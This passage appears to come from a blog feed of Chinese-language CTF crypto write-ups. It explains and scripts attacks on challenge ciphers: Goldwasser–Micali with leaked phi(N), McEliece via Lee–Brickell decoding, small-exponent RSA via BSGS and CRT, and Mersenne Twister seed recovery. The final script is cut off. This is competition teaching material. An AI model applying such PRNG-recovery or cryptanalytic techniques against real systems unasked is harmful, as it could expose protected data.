b'flag&#123;2a4d55342b46289d1f624d3083c5e2de&#125;'</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>WriteUp(HFCTF) - Crypto</title>
      <link href="/2020/04/21/WriteUp-HFCTF-Crypto/"/>
      <url>/2020/04/21/WriteUp-HFCTF-Crypto/</url>
      
        <content type="html"><![CDATA[<h3 id="gm">GM</h3><h4 id="题目考点">[题目考点]</h4><ul><li>Goldwasser–Micali (GM) cryptosystem (Legendre符号)</li></ul><h4 id="题目文件">[题目文件]</h4><p><a href="GM.zip">Click Here to Download</a></p><h4 id="题解分析">[题解分析]</h4><p>GM密钥生成：</p><p>生成大素数p,q，N=pq，再通过随机选择找到x，使得x是模p和模q的二次非剩余，则由Legendre定义知<span class="math inline">\((\frac{x}{p})=(\frac{x}{q})=-1\)</span></p><p>公钥(x, N)，私钥(p, q)</p><p>GM加密：</p><p>明文二进制表示为<span class="math inline">\((m_{1},m_{2},...,m_{n})\)</span></p><p>对每个<span class="math inline">\(m_{i}\)</span>，生成随机值<span class="math inline">\(y_{i}\)</span>，<span class="math inline">\(c_{i}=y_{i}^{2}x^{y_{i}\|m_{i}}\ mod\ N\)</span></p><p>GM解密：</p><p>密文二进制表示为<span class="math inline">\((c_{1},x_{2},...,c_{n})\)</span></p><p>对每个<span class="math inline">\(c_{i}\)</span>，验证<span class="math inline">\((\frac{c_{i}}{p})\)</span>和<span class="math inline">\((\frac{c_{i}}{q})\)</span>，则由x为二次非剩余易得，勒让德符号均为1时<span class="math inline">\(m_{i}=0\)</span>，均为-1时<span class="math inline">\(m_{i}=1\)</span></p><p>题目中泄露了<span class="math inline">\(\varphi(N)\)</span>，因此相当于暴露私钥，直接解密即可</p><h4 id="exp">[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> iroot</span><br><span class="line"></span><br><span class="line">phi = ...</span><br><span class="line">n = ...</span><br><span class="line">sum = n + <span class="number">1</span> - phi</span><br><span class="line">delta = (sum**<span class="number">2</span>) - <span class="number">4</span> * n</span><br><span class="line">sqrt_delta = int(iroot(delta, <span class="number">2</span>)[<span class="number">0</span>])</span><br><span class="line">p = (sum + sqrt_delta) // <span class="number">2</span></span><br><span class="line">q = n // p</span><br><span class="line"></span><br><span class="line">cipher = [...]</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cipher:</span><br><span class="line">    <span class="keyword">if</span> pow(i, (p - <span class="number">1</span>) // <span class="number">2</span>, p) == <span class="number">1</span> <span class="keyword">and</span> pow(i, (q - <span class="number">1</span>) // <span class="number">2</span>, q) == <span class="number">1</span>:</span><br><span class="line">        flag += <span class="string">'0'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag += <span class="string">'1'</span></span><br><span class="line">print(long_to_bytes(int(flag, <span class="number">2</span>)))</span><br></pre></td></tr></table></figure><h3 id="mceliece">mceliece</h3><p>比赛期间找到的paper有点杂，再加上Goppa码看得云里雾里，于是结束前三四个小时就去摸鱼了- -赛后填了下坑，在此做下记录</p><h4 id="题目考点-1">[题目考点]</h4><ul><li>Information-set decoding</li></ul><h4 id="题目文件-1">[题目文件]</h4><p><a href="mceliece.zip">Click Here to Download</a></p><h4 id="题解分析-1">[题解分析]</h4><p><strong>Goppa码</strong>：(具体纠错原理这里不费篇幅写，因为和本题涉及攻击方法基本无关联)</p><p><img src= "/img/loading.gif" data-src="/2020/04/21/WriteUp-HFCTF-Crypto/Snipaste_2020-04-28_16-02-18.png"></p><p>可以用[n, k, d]线性码来描述Goppa码，满足维度<span class="math inline">\(k\geq n-mt\)</span>，最小汉明重量<span class="math inline">\(d\geq t+1\)</span></p><p>其对应generator matrix为<span class="math inline">\(k\times n\)</span>，且rank(G)=k，满足<span class="math inline">\(GH^{T}=0(H^{T}为校验矩阵)\)</span></p><p>最多能纠正t个错误</p><p><strong>The McEliece cryptosystem</strong>：</p><p><img src= "/img/loading.gif" data-src="/2020/04/21/WriteUp-HFCTF-Crypto/Snipaste_2020-04-28_18-04-33.png"></p><p><span class="math inline">\(G&#39;=SGP\)</span>（S是随机生成的<span class="math inline">\(k\times k\)</span>可逆矩阵，G是Goppa码的<span class="math inline">\(k\times n\)</span>生成矩阵，P是随机的<span class="math inline">\(n\times n\)</span>排列矩阵(即每行/每列上仅有一个1，其他均为0)）</p><p>公钥为<span class="math inline">\((G&#39;,k,n)\)</span>，私钥为<span class="math inline">\((S,G,P)\)</span>及Goppa码的g等</p><p><span class="math inline">\(GF(2)\)</span>上的McEliece二进制分组长度为k，加密时<span class="math inline">\(c=mG&#39;,y=c+e\)</span>，y作为密文发送</p><p>攻击者主要有以下两种攻击途径：</p><p><img src= "/img/loading.gif" data-src="/2020/04/21/WriteUp-HFCTF-Crypto/Snipaste_2020-04-28_18-07-49.png"></p><p>这里不介绍第一种结构攻击，重点在第二种借助Information Set的攻击方法</p><p>设I为<span class="math inline">\(\{1,...,n\}\)</span>的一k元子集，则<span class="math inline">\(G_{I}\)</span>定义为：以I作列索引，从G'中得到的<span class="math inline">\(k\times k\)</span>子矩阵，如果<span class="math inline">\(G_{I}\)</span>可逆，则I满足Information Set定义</p><p>Information-set decoding一般形式下，要求输入</p><ul><li><span class="math inline">\(F_{q}^{n}\)</span>下的向量y(即McEliece系统的密文，与c的汉明距离为w)</li><li><span class="math inline">\(k\times n\)</span>矩阵G'</li></ul><p>则令I为Information Set，以其作为列索引得到<span class="math inline">\(y_{I},G_{I}\)</span>，计算<span class="math inline">\(y_{I}G_{I}^{-1}G&#39;(1\times n)\)</span>，即认为其等于c或是c的一个近似估计</p><p><strong>[Lee–Brickell’s algorithm]</strong></p><p><img src= "/img/loading.gif" data-src="/2020/04/21/WriteUp-HFCTF-Crypto/Snipaste_2020-04-28_20-03-07.png"></p><p><span class="math inline">\(g_{a}\)</span>表示<span class="math inline">\(G_{I}^{-1}G&#39;\)</span>中a索引的列上唯一的1所在的行向量（由定义易知该列上仅有1个1，其他均为零元）</p><p>Step 1中Information-set作列索引对应的<span class="math inline">\(y_{I}\)</span>，如果k个元素均无误差，则<span class="math inline">\(y_{I}G_{I}^{-1}G&#39;\)</span>能直接恢复出c（这一点很好证明），但k个元素中存在误差元时，要进行Step 3的汉明变换（<span class="math inline">\(p_{max}=w\)</span>，但一般p不取<span class="math inline">\(p_{max}\)</span>，尽管取<span class="math inline">\(p_{max}\)</span>能保证任意Information-set都能在Step 3得到正确的e，但p过大会使得Step 3中的(A, m)组合过多，适宜即可）</p><p>下图为<span class="math inline">\(p=p_{max}=w\)</span>时的运行截图</p><p><img src= "/img/loading.gif" data-src="/2020/04/21/WriteUp-HFCTF-Crypto/Snipaste_2020-04-28_22-38-03.png"></p><h4 id="exp-1">[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">cipher = load(<span class="string">"cipher.sobj"</span>)</span><br><span class="line">pubkey = load(<span class="string">"pubkey.sobj"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Lee_Brickell</span><span class="params">(y, G, Fq, w, p_max)</span>:</span></span><br><span class="line">    n, k = G.ncols(), G.nrows()</span><br><span class="line">    <span class="comment">#cnt = 0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># step 1</span></span><br><span class="line">        I = sample(range(n), k) <span class="comment"># Information Set</span></span><br><span class="line">        G_I = G.matrix_from_columns(I)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> G_I.is_invertible():</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        invG_I = G_I.inverse()</span><br><span class="line">        y_I = y.matrix_from_columns(I)</span><br><span class="line">        <span class="comment"># step 2</span></span><br><span class="line">        e_base = y - y_I * invG_I * G <span class="comment"># e which may be inaccurate</span></span><br><span class="line">        <span class="comment"># step 3</span></span><br><span class="line">        g = (invG_I * G).rows()</span><br><span class="line">        <span class="comment">#cnt += 1</span></span><br><span class="line">        <span class="comment">#print(cnt)</span></span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> range(p_max + <span class="number">1</span>): <span class="comment"># size-p subset</span></span><br><span class="line">            <span class="keyword">for</span> A <span class="keyword">in</span> itertools.combinations(range(k), p):</span><br><span class="line">                <span class="keyword">for</span> m <span class="keyword">in</span> itertools.product(Fq.list()[<span class="number">1</span>:], repeat=p):</span><br><span class="line">                    e = e_base[<span class="number">0</span>] - sum(m[i] * g[A[i]] <span class="keyword">for</span> i <span class="keyword">in</span> range(p))</span><br><span class="line">                    <span class="keyword">if</span> e.hamming_weight() == w:</span><br><span class="line">                        <span class="keyword">return</span> e</span><br><span class="line">                    </span><br><span class="line">F2 = GF(<span class="number">2</span>)</span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> cipher:</span><br><span class="line">    e = Lee_Brickell(y, pubkey, F2, <span class="number">6</span>, <span class="number">2</span>)</span><br><span class="line">    c = y - Matrix(e) <span class="comment"># m * pubkey == c</span></span><br><span class="line">    m = pubkey.solve_left(c)</span><br><span class="line">    flag += <span class="string">""</span>.join([str(i) <span class="keyword">for</span> i <span class="keyword">in</span> m[<span class="number">0</span>]])</span><br><span class="line">flag += <span class="string">"0"</span> * (<span class="number">8</span> - len(flag) % <span class="number">8</span>)</span><br><span class="line">long_to_bytes(int(flag, <span class="number">2</span>))</span><br><span class="line"><span class="comment"># b'flag&#123;c941a3cc-85e3-4401-a0f1-764206e71bf3&#125;\x00\x00\x00\x00'</span></span><br></pre></td></tr></table></figure><h4 id="ref">[Ref]</h4><p><a href="information-set-decoding.pdf">information-set-decoding.pdf</a></p><p><a href="Goppa%20Codes%20and%20Their%20Use%20in%20the%20McEliece%20Cryptosystems.pdf">Goppa Codes and Their Use in the McEliece Cryptosystems.pdf</a></p><h3 id="pell">pell</h3><h4 id="题目考点-2">[题目考点]</h4><ul><li>pell方程递推式</li></ul><h4 id="题目文件-2">[题目文件]</h4><p><a href="pell.zip">Click Here to Download</a></p><h4 id="题解分析-2">[题解分析]</h4><p>只考个pell方程递推式而已...</p><p><a href="https://blog.csdn.net/Herishwater/article/details/95640981?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-4&amp;utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-4" target="_blank" rel="noopener">https://blog.csdn.net/Herishwater/article/details/95640981?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-4&amp;utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-4</a></p><h4 id="exp-2">[exp]</h4><p>未记录</p><p>记得交互时加sleep，靶机用的socket，直接发或者延时太长发都会出错</p><h3 id="summary">Summary</h3><p>cry2看paper的时候没抓到重点...如果比赛后期不去摸鱼的话指不定还能拿下这题，wtcl</p><p>最后高校组rank27，前20进线下（自闭</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Information Set </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WriteUp(NPUCTF) - Crypto</title>
      <link href="/2020/04/19/WriteUp-NPUCTF-Crypto/"/>
      <url>/2020/04/19/WriteUp-NPUCTF-Crypto/</url>
      
        <content type="html"><![CDATA[<h3 id="认清形势建立信心">认清形势，建立信心</h3><h4 id="题目考点">[题目考点]</h4><ul><li>DLP求解</li><li>CRT</li></ul><h4 id="题目文件">[题目文件]</h4><p><a href="warm_up_683484967e8895fa6ba3db693e607491.zip.zip">Click Here to Download</a></p><h4 id="题解分析">[题解分析]</h4><p><strong>Encryption</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">p = getPrime(<span class="number">25</span>)</span><br><span class="line">e = <span class="comment"># Hidden</span></span><br><span class="line">q = getPrime(<span class="number">25</span>)</span><br><span class="line">n = p * q</span><br><span class="line">m = bytes_to_long(flag.strip(<span class="string">b"npuctf&#123;"</span>).strip(<span class="string">b"&#125;"</span>))</span><br><span class="line"></span><br><span class="line">c = pow(m, e, n)</span><br><span class="line">print(c)</span><br><span class="line">print(pow(<span class="number">2</span>, e, n))</span><br><span class="line">print(pow(<span class="number">4</span>, e, n))</span><br><span class="line">print(pow(<span class="number">8</span>, e, n))</span><br></pre></td></tr></table></figure><p><strong>Decryption</strong></p><p><span class="math inline">\(n|GCD(c_1^{2}-c_2,c_1^{3}-c_3)\)</span>，n易知</p><p><span class="math inline">\(e\in(0,n)\)</span>，即<span class="math inline">\(size(e)\leq 50\)</span>，多种方法都能求解该数量级的DLP问题</p><p>这里采用BSGS，但直接对n用BSGS还是能到<span class="math inline">\(O(2^{25})\)</span>，因此对p, q分别BSGS再CRT即可</p><p>本题的<span class="math inline">\(m\%n\)</span>有多种情况，逐一判断即可</p><h4 id="exp">[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env sage</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c1 = <span class="number">128509160179202</span></span><br><span class="line">c2 = <span class="number">518818742414340</span></span><br><span class="line">c3 = <span class="number">358553002064450</span></span><br><span class="line">n = GCD(c1**<span class="number">2</span>-c2, c1**<span class="number">3</span>-c3)</span><br><span class="line">n.factor() <span class="comment"># 2 * 18195301 * 28977097</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">n //= <span class="number">2</span></span><br><span class="line">p = <span class="number">18195301</span></span><br><span class="line">q = <span class="number">28977097</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bsgs</span><span class="params">(g, y, p)</span>:</span></span><br><span class="line">    res = []</span><br><span class="line">    m = int(ceil(sqrt(p - <span class="number">1</span>)))</span><br><span class="line">    S = &#123;pow(g, j, p):j <span class="keyword">for</span> j <span class="keyword">in</span> range(m)&#125;</span><br><span class="line">    gs = pow(g, p - <span class="number">1</span> - m, p)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(m):</span><br><span class="line">        <span class="keyword">if</span> y <span class="keyword">in</span> S:</span><br><span class="line">            res.append(i * m + S[y])</span><br><span class="line">        y = y * gs % p</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">c1_p = c1 % p</span><br><span class="line">c1_q = c1 % q</span><br><span class="line">e_1 = bsgs(<span class="number">2</span>, c1_p, p)</span><br><span class="line">e_2 = bsgs(<span class="number">2</span>, c1_q, q)</span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">e_n = [] <span class="comment"># e % phi</span></span><br><span class="line"><span class="keyword">for</span> e_p <span class="keyword">in</span> e_1:</span><br><span class="line">    <span class="keyword">for</span> e_q <span class="keyword">in</span> e_2:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            e_n.append(crt([e_p, e_q], [p - <span class="number">1</span>, q - <span class="number">1</span>])) <span class="comment"># e % phi</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">d_n = [inverse(e, phi) <span class="keyword">for</span> e <span class="keyword">in</span> e_n]</span><br><span class="line"></span><br><span class="line">m_n = set()</span><br><span class="line">c = <span class="number">169169912654178</span></span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> d_n:</span><br><span class="line">    m_n.add(pow(c, d, n))</span><br><span class="line">m_n = list(m_n)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> m_n:</span><br><span class="line">    print(<span class="string">b'npuctf&#123;'</span> + long_to_bytes(m) + <span class="string">b'&#125;'</span>)</span><br></pre></td></tr></table></figure><h4 id="more">[More]</h4><p>签到题...结果没注意加密源码里m的strip，以为<span class="math inline">\(m&gt;&gt;n\)</span>，所以其实已经解出来了还楞了好久...</p><h3 id="mersenne_twister">Mersenne_twister</h3><h4 id="题目考点-1">[题目考点]</h4><ul><li>MT逆算法</li></ul><h4 id="题目文件-1">[题目文件]</h4><p><a href="Mersenne_twister.zip">Click Here to Download</a></p><h4 id="题解分析-1">[题解分析]</h4><p><strong>Encryption</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">assert</span> len(flag) == <span class="number">26</span></span><br><span class="line"><span class="keyword">assert</span> flag[:<span class="number">7</span>] == <span class="string">'npuctf&#123;'</span></span><br><span class="line"><span class="keyword">assert</span> flag[<span class="number">-1</span>] == <span class="string">'&#125;'</span></span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(key , plain)</span>:</span></span><br><span class="line">    tmp = md5(plain).digest()</span><br><span class="line">    <span class="keyword">return</span> hexlify(XOR(tmp , key))</span><br><span class="line">...</span><br><span class="line">flag = flag.encode()</span><br><span class="line">random = mt73991(seed)</span><br><span class="line">f = open(<span class="string">'./cipher.txt'</span> , <span class="string">'wb'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    key = <span class="string">b''</span>.join([random.getramdanbits() <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">4</span>)])</span><br><span class="line">    cipher = encrypt(key , chr(i).encode())</span><br><span class="line">    f.write(cipher)</span><br></pre></td></tr></table></figure><p><strong>Decryption</strong></p><p>kpa逆encrypt函数，可得<code>mt_output[0]~mt_output[27],mt_output[100]~mt_output[103]</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Next</span><span class="params">(self , tmp)</span>:</span></span><br><span class="line">    tmp ^= (tmp &gt;&gt; <span class="number">11</span>)</span><br><span class="line">    tmp ^= (tmp &lt;&lt; <span class="number">7</span>) &amp; <span class="number">0x9ddf4680</span></span><br><span class="line">    tmp ^= (tmp &lt;&lt; <span class="number">15</span>) &amp; <span class="number">0xefc65400</span></span><br><span class="line">    tmp ^= (tmp &gt;&gt; <span class="number">18</span>) &amp; <span class="number">0x34adf670</span></span><br><span class="line">    <span class="keyword">return</span> tmp</span><br></pre></td></tr></table></figure><p>从mt_output[i]恢复出state[i]</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self , seed)</span>:</span></span><br><span class="line">    self.state = [seed] + [<span class="number">0</span>] * <span class="number">232</span></span><br><span class="line">    self.flag = <span class="number">0</span></span><br><span class="line">    self.srand()</span><br><span class="line">    self.generate()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">srand</span><span class="params">(self)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">232</span>):</span><br><span class="line">        self.state[i+<span class="number">1</span>] = <span class="number">1812433253</span> * (self.state[i] ^ (self.state[i] &gt;&gt; <span class="number">27</span>)) - i</span><br><span class="line">        self.state[i+<span class="number">1</span>] &amp;= <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate</span><span class="params">(self)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">233</span>):</span><br><span class="line">        y = (self.state[i] &amp; <span class="number">0x80000000</span>) | (self.state[(i+<span class="number">1</span>)%<span class="number">233</span>] &amp; <span class="number">0x7fffffff</span>)</span><br><span class="line">        temp = y &gt;&gt; <span class="number">1</span></span><br><span class="line">        temp ^= self.state[(i + <span class="number">130</span>) % <span class="number">233</span>]</span><br><span class="line">        <span class="keyword">if</span> y &amp; <span class="number">1</span>:</span><br><span class="line">            temp ^= <span class="number">0x9908f23f</span></span><br><span class="line">        self.state[i] = temp</span><br></pre></td></tr></table></figure><p>但这里得到的state是generate一轮后的state，所以要逆出至少一个old_state</p><p>发现<code>state[103]</code>和<code>state[0]</code>已知，且与<code>old_state[103]</code>和<code>old_state[104]</code>存在等式关系（<code>old_state[104]</code>能用<code>state[103]</code>表示）</p><p><img src= "/img/loading.gif" data-src="/2020/04/19/WriteUp-NPUCTF-Crypto/Snipaste_2020-04-20_00-22-17.png"></p><p>但s104可能存在两种可能(In [26])，因此在In [28]中进行一次判断，本题中为唯一解</p><p>得到s104后逆srand函数即可得到seed</p><p>(<code>&amp;=0xffffffff</code>等价于<code>%=0x100000000</code>，因此<code>(state[i+1]+i)*inverse(1812433253, 0x100000000)</code>即可得到<code>(self.state[i] ^ (self.state[i] &gt;&gt; 27))</code>，进而得到<code>state[i]</code></p><h4 id="exp-1">[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># In[1]:</span></span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify, unhexlify</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[2]:</span></span><br><span class="line">cipher = unhexlify(open(<span class="string">"cipher.txt"</span>, <span class="string">"rb"</span>).read())</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[3]:</span></span><br><span class="line">XOR = <span class="keyword">lambda</span> s1 ,s2 : bytes([x1 ^ x2 <span class="keyword">for</span> x1 ,x2 <span class="keyword">in</span> zip(s1 , s2)])</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[4]:</span></span><br><span class="line">prefix_mt_output = []</span><br><span class="line">prefix = <span class="string">b'npuctf&#123;'</span></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> prefix:</span><br><span class="line">    tmp = md5(chr(i).encode()).digest()</span><br><span class="line">    randnum = XOR(tmp, cipher[<span class="number">16</span> * j : <span class="number">16</span> * (j + <span 